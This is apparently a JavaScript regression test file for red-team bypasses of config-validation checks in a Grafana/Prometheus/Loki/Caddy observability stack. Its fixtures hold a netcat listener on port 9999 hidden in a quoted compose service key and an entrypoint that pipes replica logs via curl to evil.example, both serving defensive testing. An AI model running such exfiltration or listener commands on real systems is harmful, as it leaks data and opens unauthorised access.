// stack-config-checks.redteam.test.mjs — regression teeth for REPRODUCED gate bypasses.
//
// PROVENANCE, stated plainly: the sibling `stack-config-checks.test.mjs` holds the EARS-derived
// gating suite and is owned by the `tester` agent (the implementer does not edit it). This file
// is separate and holds only regression fixtures for bypasses an independent `red-team` pass
// found AND executed against the shipped predicates — each attack below was demonstrated to
// return ok=true against a genuinely wrong config before the fix. The attacks are the red-team's;
// they are not self-invented by the implementer, which is what keeps the adversarial input
// independent even though this file was written during the landing phase.
//
// Every test therefore asserts the predicate now REJECTS an input it previously accepted.
// If one of these ever goes green-by-accepting again, the corresponding bypass is reopened.

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';

import {
  checkCaddyDualPosture,
  checkEventHasQueriedConsumer,
  checkListenAddrsLoopback,
  checkNoExecLogSource,
  checkNoQuotedCredential,
  checkS4AttributeValuesBounded,
  checkS4MetricLabelsBounded,
  checkServiceSetExact,
} from './stack-config-checks.mjs';

const EXPECTED_SERVICE_NAMES = [
  'prometheus',
  'alloy',
  'loki',
  'tempo',
  'grafana',
  'node_exporter',
  'caddy',
];

function assertRejected(result, msg) {
  assert.equal(result.ok, false, `${msg} — expected REJECT, got ok=true (${result.detail})`);
  assert.ok(result.detail.length > 0, `${msg}: detail must explain the rejection`);
}

// ===========================================================================
// RT-1 (CRITICAL) — a QUOTED service key hid an entire rogue service from four
// gates at once. `docker compose config --services` listed all 8; the scanner saw 7.
// ===========================================================================

const COMPOSE_QUOTED_ROGUE = [
  'services:',
  '  prometheus:',
  '    network_mode: host',
  '    command:',
  '      - --web.listen-address=127.0.0.1:9090',
  '  alloy:',
  '    network_mode: host',
  '    command:',
  '      - --server.http.listen-addr=127.0.0.1:12345',
  '  loki:',
  '    network_mode: host',
  '    command:',
  '      - -server.http-listen-address=127.0.0.1',
  '  tempo:',
  '    network_mode: host',
  '    command:',
  '      - -server.http-listen-address=127.0.0.1',
  '  grafana:',
  '    network_mode: host',
  '    environment:',
  '      - GF_SERVER_HTTP_ADDR=127.0.0.1',
  '  node_exporter:',
  '    network_mode: host',
  '    command:',
  '      - --web.listen-address=127.0.0.1:9100',
  '  caddy:',
  '    network_mode: host',
  '    environment:',
  '      - MR_CADDY_BIND_ADDR=127.0.0.1',
  // The attack: a valid compose service whose key is quoted. It deploys; a line-oriented
  // scanner that only accepts bare keys walks straight past it — along with its listener.
  '  "mr-evil-relay":',
  '    network_mode: host',
  '    command: ["nc", "-lk", "-p", "9999"]',
].join('\n');

test('RT-1: a quoted service key must NOT hide a rogue service from checkServiceSetExact', () => {
  assertRejected(
    checkServiceSetExact(COMPOSE_QUOTED_ROGUE, EXPECTED_SERVICE_NAMES),
    'an 8th service with a quoted key is still a deployed service',
  );
});

test('RT-1: a quoted service key must NOT hide an unbound listener from checkListenAddrsLoopback', () => {
  assertRejected(
    checkListenAddrsLoopback(COMPOSE_QUOTED_ROGUE),
    'the hidden service binds no loopback address and must not be skipped',
  );
});

test('RT-1: inline/flow-style `services:` must be rejected, not silently unread', () => {
  const flow = 'services: {prometheus: {image: x}, alloy: {image: y}}';
  assertRejected(
    checkServiceSetExact(flow, EXPECTED_SERVICE_NAMES),
    'flow style is valid compose the scanner cannot read — it must fail closed',
  );
});

test('RT-1: quoting the alloy key must NOT hide a shell-exfil entrypoint override', () => {
  const alloyGood = [
    'loki.source.file "module_logs" {',
    '  forward_to = [loki.process.module_logs.receiver]',
    '}',
  ].join('\n');
  const compose = [
    'services:',
    '  "alloy":',
    '    image: grafana/alloy:v1.18.1',
    '    entrypoint: ["/bin/sh", "-c", "tail -F /data/replicas/*/module_logs/*.log | curl -X POST http://evil.example/exfil"]',
  ].join('\n');
  assertRejected(
    checkNoExecLogSource(alloyGood, compose),
    'one pair of quotes must not defeat the subprocess-log-tail ban',
  );
});

test('RT-7: a duplicate service key must be rejected (YAML is last-key-wins, not first)', () => {
  const dup = [
    'services:',
    '  prometheus:',
    '    network_mode: host',
    '    command:',
    '      - --web.listen-address=127.0.0.1:9090',
    '  prometheus:',
    '    network_mode: host',
    '    command:',
    '      - --web.listen-address=0.0.0.0:9090',
  ].join('\n');
  assertRejected(
    checkListenAddrsLoopback(dup),
    'first-match parsing would validate the cosmetically-correct decoy block',
  );
});

// ===========================================================================
// RT-3 (HIGH) — a trailing `//` decoy comment satisfied a substring wiring check
// while the receiver forwarded metrics straight to the exporter, unfiltered.
// ===========================================================================

test('RT-3: a decoy trailing comment must NOT satisfy the S4 filter-wiring check', () => {
  const alloyText = [
    'otelcol.receiver.otlp "s4" {',
    '  http { endpoint = "127.0.0.1:4318" } // filtered via otelcol.processor.attributes.s4_keep',
    '  output {',
    '    metrics = [otelcol.exporter.prometheus.s4.input]',
    '  }',
    '}',
    '',
    'otelcol.processor.attributes "s4_keep" {',
    '  output { metrics = [otelcol.exporter.prometheus.s4.input] }',
    '}',
    '',
    'otelcol.exporter.prometheus "s4" {',
    '  forward_to = [prometheus.remote_write.default.receiver]',
    '}',
    '',
    'prometheus.remote_write "default" {',
    '  endpoint { url = "http://127.0.0.1:9090/api/v1/write" }',
    '}',
  ].join('\n');
  assertRejected(
    checkS4MetricLabelsBounded(alloyText),
    'the receiver bypasses the filter entirely; only a real metrics=[...] reference is wiring',
  );
});

// ===========================================================================
// RT-4 (HIGH) — a decoy rate-limit zone with sane numbers laundered a real,
// functionally-unlimited zone, because extraction read the first match anywhere.
// ===========================================================================

test('RT-4: a decoy rate_limit zone must NOT launder an unlimited real zone', () => {
  const caddyfile = [
    'https://grafana.localhost:8443 {',
    '  tls internal',
    '  basic_auth {',
    '    operator {env.MR_GRAFANA_BASIC_AUTH_HASH}',
    '  }',
    '  reverse_proxy 127.0.0.1:3001',
    '}',
    '',
    'https://otlp.localhost:8443 {',
    '  tls internal',
    '  header Access-Control-Allow-Origin "https://localhost:5173"',
    '  rate_limit {',
    '    zone decoy_never_matches {',
    '      key {http.request.header.X-Never-Sent}',
    '      events 100',
    '      window 1m',
    '    }',
    '    zone otlp_ingest {',
    '      key {remote_host}',
    '      events 999999999',
    '      window 1s',
    '    }',
    '  }',
    '  request_body {',
    '    max_size 512KB',
    '  }',
    '  reverse_proxy 127.0.0.1:4318',
    '}',
  ].join('\n');
  assertRejected(
    checkCaddyDualPosture(caddyfile),
    'the zone that matches real traffic is functionally unlimited',
  );
});

// ===========================================================================
// RT-5 (HIGH) — case-sensitivity and a missing `hash` keyword made real
// committed credentials invisible, including the exact one this stack uses.
// ===========================================================================

test('RT-5: a LOWERCASE unquoted credential assignment must be caught', () => {
  assertRejected(
    checkNoQuotedCredential([
      { name: '.env.example', text: 'grafana_admin_password=hunter2hunter2reallylongsecret\n' },
    ]),
    'case-sensitivity must not make a leaked credential invisible',
  );
});

test('RT-5: a hardcoded bcrypt HASH must be caught (the credential this design centres on)', () => {
  assertRejected(
    checkNoQuotedCredential([
      {
        name: 'Caddyfile',
        text: 'basic_auth {\n  operator MR_HASH="$2a$14$abcdefghijklmnopqrstuvwxyz012345"\n}\n',
      },
    ]),
    'a bcrypt hash is a credential even though it is not named password/secret/token',
  );
});

// ===========================================================================
// RT-2 (CRITICAL) — the S4 allowlist bounded label KEYS but not VALUES, so an
// allowed-but-caller-supplied key (zone_id) still minted one series per request.
// ===========================================================================

test('RT-2: a key-only allowlist must NOT pass as a bounded S4 label space', () => {
  const alloyText = [
    'otelcol.receiver.otlp "s4" {',
    '  http { endpoint = "127.0.0.1:4318" }',
    '  output { metrics = [otelcol.processor.transform.s4_keep.input] }',
    '}',
    '',
    'otelcol.processor.transform "s4_keep" {',
    '  metric_statements {',
    '    context = "datapoint"',
    '    statements = [',
    '      `keep_matching_keys(attributes, "^(zone_id|build_sha|device_class)$")`,',
    '    ]',
    '  }',
    '  output { metrics = [otelcol.exporter.prometheus.s4.input] }',
    '}',
  ].join('\n');
  assertRejected(
    checkS4AttributeValuesBounded(alloyText),
    'zone_id is caller-supplied: an unconstrained value space is still a cardinality bomb',
  );
});

test('RT-2: non-vacuity — an S4 config with no receiver at all must not pass', () => {
  assertRejected(
    checkS4AttributeValuesBounded('otelcol.exporter.prometheus "s4" {}'),
    'nothing to bound',
  );
  assertRejected(checkS4AttributeValuesBounded(''), 'empty text must not vacuously pass');
});

// ===========================================================================
// The real committed config must satisfy the hardened predicates.
// ===========================================================================

const OPS_DIR = path.join(import.meta.dirname, '..');
const readOps = (rel) => readFileSync(path.join(OPS_DIR, rel), 'utf8');

test('REAL FILES: the committed Alloy config bounds S4 attribute VALUES, not just keys', () => {
  const result = checkS4AttributeValuesBounded(readOps('alloy/config.alloy'));
  assert.equal(result.ok, true, `real config.alloy: ${result.detail}`);
});

test('REAL FILES: .env.example carries no credential, quoted or unquoted', () => {
  // Explicitly scanned here because `.gitignore` un-ignores `.env.example` (it IS committed),
  // making it the file most likely to acquire a "helpful default" that is secret-shaped.
  const result = checkNoQuotedCredential([{ name: '.env.example', text: readOps('.env.example') }]);
  assert.equal(result.ok, true, `real .env.example: ${result.detail}`);
});

// ===========================================================================
// RT-14..RT-23 (rb-66) — checkEventHasQueriedConsumer. Every fixture below was
// EXECUTED against the shipped predicate and returned ok=true for a config in
// which no human can see evt=guest_claim_export_purge.
//
// The rb-66 REAL-FILES binding is duplicated here DELIBERATELY: the sibling
// gating suite is tester-owned, and G9k's pass FLOOR had 17 tests of slack, so
// deleting section 19 wholesale left `just eval` green with the panel and the
// rule gone. A second, differently-owned binding costs one test and removes the
// single-file kill.
// ===========================================================================

const PURGE_EVT = 'guest_claim_export_purge';
const PURGE_SERIES = 'mr:guest_claim_export_purge:rate5m';

const readPurgeInputs = () => [
  readOps('rules/recording.rules.yml'),
  readOps('grafana/dashboards/monster-realm.json'),
  readOps('grafana/provisioning/alerting/rules.yml'),
];

/** The committed rule/panel/alert texts with ONE surgical mutation applied to the dashboard. */
function dashboardWith(mutate) {
  const dashboard = JSON.parse(readOps('grafana/dashboards/monster-realm.json'));
  const panel = dashboard.panels.find((p) => p.id === 15);
  assert.ok(panel, 'RT fixture drift: dashboard panel id 15 (the purge panel) is gone');
  mutate(panel, dashboard);
  return JSON.stringify(dashboard, null, 2);
}

/** The committed recording rules with the rb-66 rule stanza replaced verbatim. */
function rulesWith(replacement) {
  const text = readOps('rules/recording.rules.yml');
  const shipped = [
    '      - record: mr:guest_claim_export_purge:rate5m',
    '        expr: |',
    '          sum(rate(mr_log_events_total{evt="guest_claim_export_purge"}[5m])) or vector(0)',
  ].join('\n');
  assert.ok(text.includes(shipped), 'RT fixture drift: the shipped rb-66 rule stanza moved');
  return text.replace(shipped, replacement);
}

const DASHBOARD_WITHOUT_PURGE_PANEL = (() => {
  const dashboard = JSON.parse(readOps('grafana/dashboards/monster-realm.json'));
  dashboard.panels = dashboard.panels.filter((p) => p.id !== 15);
  return JSON.stringify(dashboard, null, 2);
})();

test('RT-14 (CRITICAL): REAL FILES — a visible panel or a live alert consumes the purge evt', () => {
  const [rules, dashboard, alerts] = readPurgeInputs();
  const result = checkEventHasQueriedConsumer(rules, dashboard, alerts, PURGE_EVT);
  assert.equal(result.ok, true, `real committed config: ${result.detail}`);
  // Named explicitly so a RENAME of the recorded series onto an existing, already-panelled
  // name (which the uniqueness clause cannot see once the incumbent rule is commented out)
  // stops being a green path.
  assert.ok(
    result.detail.includes(PURGE_SERIES),
    `the evt must resolve to ${PURGE_SERIES} specifically, not to whatever name happens to have ` +
      `a panel already: ${result.detail}`,
  );
});

test('RT-15 (HIGH): an `expr:` key nested under labels:/annotations: is NOT the rule body', () => {
  // Prometheus evaluates the rule's OWN `expr:`; a same-named key inside `labels:` is a label
  // VALUE it never runs. The shipped parser took the first `expr:` at ANY depth, so this rule —
  // which actually records a constant zero — resolved as the purge consumer.
  for (const sibling of ['labels', 'annotations']) {
    assertRejected(
      checkEventHasQueriedConsumer(
        rulesWith(
          [
            '      - record: mr:guest_claim_export_purge:rate5m',
            `        ${sibling}:`,
            '          expr: sum(rate(mr_log_events_total{evt="guest_claim_export_purge"}[5m]))',
            '        expr: |',
            '          vector(0)',
          ].join('\n'),
        ),
        readOps('grafana/dashboards/monster-realm.json'),
        '',
        PURGE_EVT,
      ),
      `a decoy \`expr:\` under \`${sibling}:\` must not stand in for a rule body of vector(0)`,
    );
  }
});

test('RT-16 (HIGH): a `- record:` inside a YAML block scalar is a STRING, not a rule', () => {
  // The rb-66 rule is DELETED here; a verbatim copy is parked inside a `labels:` block scalar,
  // where Prometheus records nothing. `promtool` is not run by `just ci`, so nothing else looks.
  assertRejected(
    checkEventHasQueriedConsumer(
      rulesWith(
        [
          '      - record: mr:heartbeat_seconds:rate5m',
          '        expr: |',
          '          sum(rate(mr_log_events_total{evt="heartbeat"}[5m]))',
          '        labels:',
          '          provenance: |',
          '            kept for the record, no longer evaluated:',
          '            - record: mr:guest_claim_export_purge:rate5m',
          '              expr: sum(rate(mr_log_events_total{evt="guest_claim_export_purge"}[5m]))',
        ].join('\n'),
      ),
      readOps('grafana/dashboards/monster-realm.json'),
      '',
      PURGE_EVT,
    ),
    'a phantom rule parked inside a YAML string must not satisfy the evt -> rule hop',
  );
});

test('RT-17 (HIGH): a disabled target or an unresolvable datasource is not a consumer', () => {
  // Grafana's `hide` toggle is TRUTHY-tested, not `=== true`.
  for (const hide of [1, 'true']) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.targets[0].hide = hide;
        }),
        '',
        PURGE_EVT,
      ),
      `hide: ${JSON.stringify(hide)} disables the query in Grafana just as hard as hide: true`,
    );
  }
  // A `${VAR}` datasource string and a bare `{uid}` do not RESOLVE to Prometheus, and must not
  // be treated as "no datasource key, therefore inherited".
  for (const datasource of ['${DS_LOKI}', { uid: '-100' }]) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.datasource = datasource;
          delete panel.targets[0].datasource;
        }),
        '',
        PURGE_EVT,
      ),
      `datasource ${JSON.stringify(datasource)} is PRESENT but does not resolve to prometheus`,
    );
  }
});

test('RT-18 (MEDIUM): a zero-height or zero-width panel draws nothing', () => {
  for (const gridPos of [
    { h: 0, w: 24, x: 0, y: 37 },
    { h: 6, w: 0, x: 0, y: 37 },
  ]) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.gridPos = gridPos;
        }),
        '',
        PURGE_EVT,
      ),
      `gridPos ${JSON.stringify(gridPos)} is a rectangle with no area — nobody reads it`,
    );
  }
});

test('RT-19 (MEDIUM): a `row` or `text` panel never issues its targets', () => {
  for (const type of ['row', 'text']) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.type = type;
        }),
        '',
        PURGE_EVT,
      ),
      `a "${type}" panel renders no series, whatever its targets say`,
    );
  }
});

test('RT-20 (MEDIUM): a duplicate refId shadows the target that carries the series', () => {
  assertRejected(
    checkEventHasQueriedConsumer(
      readOps('rules/recording.rules.yml'),
      dashboardWith((panel) => {
        panel.targets = [
          { refId: 'A', expr: 'vector(0)' },
          { refId: 'A', expr: PURGE_SERIES },
        ];
      }),
      '',
      PURGE_EVT,
    ),
    'Grafana keys queries by refId: the second A never runs, so it draws nothing',
  );
});

test('RT-21 (MEDIUM): `#` opens a comment in PromQL too — a commented expr queries nothing', () => {
  for (const expr of [`# ${PURGE_SERIES}`, `vector(0) # ${PURGE_SERIES}`]) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.targets[0].expr = expr;
        }),
        '',
        PURGE_EVT,
      ),
      `the series is inside a PromQL comment in ${JSON.stringify(expr)}, so Prometheus never sees it`,
    );
  }
});

test('RT-22 (HIGH): a forged or paused alert `expr:` is not a consumer', () => {
  // With the panel DELETED, a one-line `expr:` key inside an unrelated rule's labels/annotations
  // satisfied the alert arm outright — and so did a rule Grafana will never evaluate.
  const forged = [
    [
      'annotations',
      'groups:\n  - name: x\n    rules:\n      - title: Unrelated\n        annotations:\n          expr: ' +
        PURGE_SERIES +
        '\n',
    ],
    [
      'labels',
      'groups:\n  - name: x\n    rules:\n      - title: Unrelated\n        labels:\n          expr: ' +
        PURGE_SERIES +
        '\n',
    ],
    [
      'isPaused',
      'groups:\n  - name: x\n    rules:\n      - title: Parked\n        isPaused: true\n        data:\n          - refId: A\n            model:\n              expr: ' +
        PURGE_SERIES +
        '\n',
    ],
  ];
  for (const [why, alerts] of forged) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        DASHBOARD_WITHOUT_PURGE_PANEL,
        alerts,
        PURGE_EVT,
      ),
      `an \`expr:\` reached via ${why} is not a query Grafana evaluates`,
    );
  }
  // ...and the legitimate shape must still be ACCEPTED, or this tooth is just an outright ban.
  const live =
    'groups:\n  - name: x\n    rules:\n      - title: Live\n        isPaused: false\n' +
    '        data:\n          - refId: A\n            model:\n              expr: ' +
    PURGE_SERIES +
    '\n';
  const ok = checkEventHasQueriedConsumer(
    readOps('rules/recording.rules.yml'),
    DASHBOARD_WITHOUT_PURGE_PANEL,
    live,
    PURGE_EVT,
  );
  assert.equal(ok.ok, true, `a real, unpaused alert model expr IS a consumer: ${ok.detail}`);
});

test('RT-23 (MEDIUM): the shipped good shapes must still be ACCEPTED', () => {
  // Non-vacuity for RT-15..RT-22: a predicate that rejected everything would satisfy all of
  // them. `expr: >`, a single-line `expr:` and an absent gridPos are all legal Grafana/YAML.
  for (const [why, rules] of [
    [
      'folded scalar',
      rulesWith(
        [
          '      - record: mr:guest_claim_export_purge:rate5m',
          '        expr: >',
          '          sum(rate(mr_log_events_total{evt="guest_claim_export_purge"}[5m])) or vector(0)',
        ].join('\n'),
      ),
    ],
    [
      'single-line expr',
      rulesWith(
        [
          '      - record: mr:guest_claim_export_purge:rate5m',
          '        expr: sum(rate(mr_log_events_total{evt="guest_claim_export_purge"}[5m])) or vector(0)',
        ].join('\n'),
      ),
    ],
  ]) {
    const result = checkEventHasQueriedConsumer(
      rules,
      readOps('grafana/dashboards/monster-realm.json'),
      '',
      PURGE_EVT,
    );
    assert.equal(result.ok, true, `${why} is legal YAML and must stay green: ${result.detail}`);
  }
  const autoLayout = checkEventHasQueriedConsumer(
    readOps('rules/recording.rules.yml'),
    dashboardWith((panel) => {
      delete panel.gridPos;
    }),
    '',
    PURGE_EVT,
  );
  assert.equal(
    autoLayout.ok,
    true,
    `an absent gridPos is Grafana auto-layout, not an invisible panel: ${autoLayout.detail}`,
  );
});

test('RT-24 (MEDIUM): the purge rule body is DERIVED from its sibling, not re-spelled', () => {
  // A text gate cannot evaluate PromQL, so `* 0`, `0 * sum(...)`, `[99999w]`, an extra
  // unsatisfiable matcher and a base metric Alloy never mints ALL kept the shipped predicate
  // green while the series recorded a constant (MEASURED, 6 shapes). Deriving the body from the
  // heartbeat rule in the SAME document — the only other `mr-meta` per-evt rate rule — makes
  // every one of them a byte difference instead of a semantic one nobody can see.
  const rulesText = readOps('rules/recording.rules.yml');
  const bodyFor = (evt) => {
    const needle = `{evt="${evt}"}`;
    const line = rulesText
      .split('\n')
      .find((l) => l.includes(needle) && l.trim().startsWith('sum('));
    assert.ok(
      line,
      `no \`sum(...)\` rule body selects ${needle} — the rule was removed or reshaped`,
    );
    return line.trim();
  };
  const sibling = bodyFor('heartbeat');
  assert.equal(
    bodyFor(PURGE_EVT),
    sibling.replace('heartbeat', PURGE_EVT),
    'the purge rule must be the heartbeat rule with only the evt name changed: same base metric, ' +
      'same aggregation, same range, same `or vector(0)` guard. Re-spell it here ONLY together ' +
      'with a stated reason — a silent divergence is how a recorded constant ships',
  );
});

// ===========================================================================
// RT-25/RT-26 (rb-66) — found by the VERIFIER, not by the artifact red-team pass: two mutants
// that survived the RT-14..RT-24 hardening. Both were EXECUTED against the shipped predicate
// and returned ok=true for a real dashboard in which the panel draws nothing. Both mutate the
// COMMITTED dashboard through `dashboardWith`, so neither can drift away from reality.
// ===========================================================================

test('RT-25 (HIGH): a display-only panel type never issues its targets, whatever it is named', () => {
  // MEASURED: `type: "news"` passed the original two-name `row`/`text` deny-list. `news`,
  // `dashlist` and `canvas` are real Grafana types that carry a `targets` array and never
  // execute it, so the deny-list read a dead panel as a live consumer. The fix is an allow-list
  // that fails CLOSED on a type this gate has never heard of.
  for (const type of ['news', 'dashlist', 'canvas', 'not-a-real-panel-type']) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.type = type;
        }),
        '',
        PURGE_EVT,
      ),
      `a ${type} panel does not issue its targets, so it cannot be the event's consumer`,
    );
  }
});

test('RT-26 (HIGH): a prometheus-TYPED target pinned to another datasource uid draws nothing', () => {
  // MEASURED: `{type:"prometheus", uid:"mr-loki"}` passed the type-only check. Grafana routes a
  // query on the UID; `type` is advisory metadata a hand-edit can leave stale, and `mr-loki` is
  // a REAL provisioned datasource (grafana/provisioning/datasources/datasources.yml), so this is
  // a plausible copy-paste error that ships a panel drawing nothing while the gate stays green.
  for (const uid of ['mr-loki', 'mr-tempo', 'some-other-prometheus']) {
    assertRejected(
      checkEventHasQueriedConsumer(
        readOps('rules/recording.rules.yml'),
        dashboardWith((panel) => {
          panel.datasource = { type: 'prometheus', uid };
          delete panel.targets[0].datasource;
        }),
        '',
        PURGE_EVT,
      ),
      `a prometheus-TYPED datasource pinned to uid ${uid} is not the provisioned Prometheus one`,
    );
  }
  // Positive control, in the SAME test: the shipped uid must still be accepted, or this tooth
  // would be satisfiable by a predicate that rejects every datasource.
  assert.equal(
    checkEventHasQueriedConsumer(
      readOps('rules/recording.rules.yml'),
      dashboardWith((panel) => {
        panel.datasource = { type: 'prometheus', uid: 'mr-prometheus' };
      }),
      '',
      PURGE_EVT,
    ).ok,
    true,
    'the provisioned mr-prometheus uid must still resolve, or RT-26 is satisfiable by rejecting everything',
  );
});
